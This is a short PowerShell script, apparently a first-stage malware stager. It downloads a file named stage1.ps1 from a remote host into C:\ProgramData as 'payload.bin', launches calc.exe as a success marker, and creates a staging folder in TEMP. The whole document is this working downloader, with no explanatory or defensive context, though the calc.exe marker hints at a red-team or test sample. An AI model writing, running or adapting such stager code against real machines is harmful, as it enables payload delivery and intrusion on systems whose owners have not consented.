
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://internal.corp:443/stage1.ps1',
    [string]$DropPath = "C:\ProgramData\payload.bin",
    [int]$TimeoutSec = 229
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$StageResult = Get-Stage1Payload -SourceUrl $PayloadUrl -DestinationPath $DropPath -TimeoutSec $TimeoutSec
if ($StageResult) {
    Start-Process -FilePath "calc.exe"
}
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
